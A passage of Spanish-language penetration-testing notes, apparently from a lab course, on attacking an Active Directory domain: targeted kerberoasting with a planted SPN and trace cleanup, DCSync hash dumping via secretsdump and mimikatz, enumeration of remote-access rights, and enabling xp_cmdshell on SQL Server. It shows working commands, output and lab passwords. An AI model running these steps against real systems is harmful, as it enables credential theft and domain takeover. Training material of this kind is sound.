ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```
Podemos intentar cambiarle la contraseña o podemos ejecutar un `kerberoasting attack`, el riesgoso cambiar contraseñas de usuarios por lo que aplicaremos la segunda opción.

```powershell
PS C:\tools> Set-DomainObject -Credential $dcred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base:
LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object
'adunn'
```
Ejecutamos Rubeus y procedemos a crackear al hash obtenido.

```poweshell
PS C:\tools> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEF<SNIP>
```
Para borrar los rastros que tuvimos en ese trayecto procedmos a eliminar el servicio del usuario adunn

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

```
## DCSync Attack

DCSync es una técnica para robar la base de datos de contraseñas de Active Directory mediante el uso del Directory Replication Service Remote Protocol,que utilizan los controladores de dominio para 
replicar datos de dominio. Esto permite que un atacante imite un controlador de dominio para recuperar los hash de contraseña NTLM del usuario. Con el permiso `DS-Replication-Get-Changes-All` 
pedimos al DC que replique las contraseñas NTLM. Para este ataque podemos usar `secretsdump.py` para obtener los hashes NTLM.

```powershell
ecretsdump.py INLANEFREIGHT/adunn:SyncMaster757@10.129.60.15 -history
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb161bd19ba83e959babef96e5ef4cadf
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08

<SNIP>
```
Igualmente podemos usar mimikatz para este trabajo 

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500
```
Hay veces que existen usuarios que tienen habilitado el `Store password using reversible encryption` que hace que guarda la contraseña en RC4, puede llegar a ser útil saber esto

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

## RDP, WINRM, MSSQL

Al comprometer una máquina encontramos que habrá usuarios con privilegios de usar rdp, winrm o mssql, esto con el fin de poder migrar a otro host y poder enumerar o movernos vertical o latermalmente

Para enumerar usuarios con permisos de usar rdp podemos usar:

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```
Arriba vemos que todos los usuarios del dominio tienen este privilegio, al peretenecer al grupo Domain Users. Y para el privlegio `Remote Management Users` vemos que el usuario `forend` es el
único con este privilegio.

```powershell
PS C:\tools> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"


ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```
Igualmente mediante bloodhound podemos enumerar todos estos datos, en el apartado de `node info` > `Execution Rights`. Podemos usar una quiery donde nos muestre la información dentro de bloodhound
que podemos agrara dentro del mismo para seguir utilizándola.

```shell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
Aparte del uso de winrm, podemos usar PSSesion para conectarnos mediante este servicio

```powershell
PS C:\tools> $pass = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\tools> $cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\forend",$pass)
PS C:\tools> hostname
ACADEMY-EA-MS01
PS C:\tools> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend.INLANEFREIGHT\Documents> whoami
inlanefreight\forend
```
También podemos buscar información acerca de sql server, por ejemplo, saber quién tiene permisos de administrador sobre este servicio.Por bloodhound podemos usar esta query

```shell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
o con `PowerUpSQL.ps1`

```powershell
PS C:\tools\PowerUpSQL> Get-SQLInstanceDomain


ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/10/2022 3:50 PM
Description      :
```

Podemos entonces poder hacer peticiones de información hacia el servicio

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```
Si queremos hacerlo desde nuestra máquina linux, podemos hacer uno de `mssqlclient.py`

```shell
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```
En este punto podemos habilitar `xp_cmdshell` para poder ejecutar comandos.

```sql
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL               

```

